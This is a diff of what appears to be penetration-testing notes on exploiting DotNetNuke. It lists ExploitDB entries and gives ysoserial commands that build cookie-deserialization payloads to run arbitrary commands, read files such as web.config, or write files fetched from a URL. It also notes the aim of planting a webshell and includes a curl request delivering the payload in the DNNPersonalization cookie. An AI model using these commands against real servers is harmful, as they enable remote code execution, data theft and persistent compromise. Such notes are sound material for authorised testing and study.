@@ -61,7 +61,7 @@ Disallow: /Activity-Feed/userId/	# Do not index user profiles
 ###### ExploitDB exploits (as of 2021-08-08)
 
 ```
-→ searchsploit DotNetNuke
+searchsploit DotNetNuke
 
 DotNetNuke - Arbitrary File Upload                                                 | asp/webapps/12700.txt
 DotNetNuke - Cookie Deserialization Remote Code Execution (Metasploit)             | windows/remote/48336.rb
@@ -148,10 +148,9 @@ in the execution of the specified command or arbitrary read / write of the
 given file against `DotNetNuke` version `5.0.0 to 9.1.0`.
 
 ```
-.\ysoserial.exe -p DotNetNuke -m run_command -c "<COMMAND>"
-.\ysoserial.exe -p DotNetNuke -m read_file -f "<FILE | FILE_FULL_PATH>"
-.\ysoserial.exe -p DotNetNuke -m write_file -u "<FILE_TO_FETCH_URL>" -f "<FILE>"
-
+ysoserial.exe -p DotNetNuke -m run_command -c "<COMMAND>"
+ysoserial.exe -p DotNetNuke -m read_file -f "<FILE | FILE_FULL_PATH>"
+ysoserial.exe -p DotNetNuke -m write_file -u "<FILE_TO_FETCH_URL>" -f "<FILE>"
 
 # Retrieves the "web.config" configuration file (in its default location) in order to identify the webserver hosted directories for the upload o a webshell.
 .\ysoserial.exe -p DotNetNuke -m read_file -f C:\DotNetNuke\web.config
@@ -164,4 +163,13 @@ for example, the `curl` utility:
 ```
 curl -i -s -k -X 'GET' \
     -b '.DOTNETNUKE=;DNNPersonalization=<SERIALIZED_PAYLOAD>' \
-    'http://10.10.110.10/pagedoesnotexist123456789abc'
+    'http://<IP | HOSTNAME>/pagedoesnotexist123456789abc'
+```
+
+--------------------------------------------------------------------------------
+
+### References
+
+https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf
+https://www.exploit-db.com/exploits/48336
+https://pentest-tools.com/blog/exploit-dotnetnuke-cookie-deserialization/
